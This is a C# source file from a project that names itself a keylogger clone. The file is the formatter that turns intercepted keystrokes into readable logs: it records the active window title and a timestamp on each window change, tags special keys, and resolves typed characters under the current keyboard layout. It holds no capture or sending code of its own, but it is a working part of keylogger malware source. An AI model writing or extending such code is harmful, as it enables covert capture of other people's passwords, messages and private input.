using System;
using System.Text;
using KeyLoggerClone.Core;

namespace KeyLoggerClone.Formatters
{
    /// <summary>
    /// Translates key intercepts into a clean, human-readable format.
    /// Manages window transition headers and unicode character mapping.
    /// </summary>
    public class HumanReadableFormatter : IKeyFormatter
    {
        private string _lastWindow = string.Empty;

        public string Format(KeyInterceptedEventArgs e)
        {
            var sb = new StringBuilder();

            // Track active window change
            if (e.ActiveWindow != _lastWindow)
            {
                _lastWindow = e.ActiveWindow;
                sb.Append($"\r\n\r\n[WINDOW: {_lastWindow}] - [TIME: {e.Timestamp:yyyy-MM-dd HH:mm:ss}]\r\n--------------------------------------------------\r\n");
            }

            sb.Append(TranslateKey(e));
            return sb.ToString();
        }

        private string TranslateKey(KeyInterceptedEventArgs e)
        {
            // Direct special key overrides
            switch (e.VkCode)
            {
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 13: return "[ENTER]\r\n";
                case 20: return "[CAPSLOCK]";
                case 27: return "[ESC]";
                case 32: return " "; // Normal space
                case 33: return "[PAGEUP]";
                case 34: return "[PAGEDOWN]";
                case 35: return "[END]";
                case 36: return "[HOME]";
                case 37: return "[LEFT]";
                case 38: return "[UP]";
                case 39: return "[RIGHT]";
                case 40: return "[DOWN]";
                case 45: return "[INSERT]";
                case 46: return "[DELETE]";
                case 91:
                case 92:
                    return "[WIN]";
                case 16:
                case 160:
                case 161:
                    return ""; // Let shift state be handled by Unicode character translation
                case 17:
                case 162:
                case 163:
                    return "[CTRL]";
                case 18:
                case 164:
                case 165:
                    return "[ALT]";
            }

            // Function keys (F1 - F12)
            if (e.VkCode >= 112 && e.VkCode <= 123)
            {
                return $"[F{e.VkCode - 111}]";
            }

            // Attempt to resolve under active keyboard layout
            string resolvedChar = GetUnicodeChar(e.VkCode, e.ScanCode, e.IsShiftPressed, e.IsCapsLockOn);
            if (!string.IsNullOrEmpty(resolvedChar) && !char.IsControl(resolvedChar[0]))
            {
                return resolvedChar;
            }

            // Fallback to raw Key Name
            return $"[{e.KeyName}]";
        }

        private string GetUnicodeChar(uint vkCode, uint scanCode, bool isShift, bool isCapsLock)
        {
            var sb = new StringBuilder(5);
            var keyState = new byte[256];

            if (isShift) keyState[Win32Api.VK_SHIFT] = 0x80;
            if (isCapsLock) keyState[Win32Api.VK_CAPITAL] = 0x01;

            int result = Win32Api.ToUnicode(vkCode, scanCode, keyState, sb, sb.Capacity, 0);
            if (result > 0)
            {
                return sb.ToString();
            }

            return string.Empty;
        }
    }
}
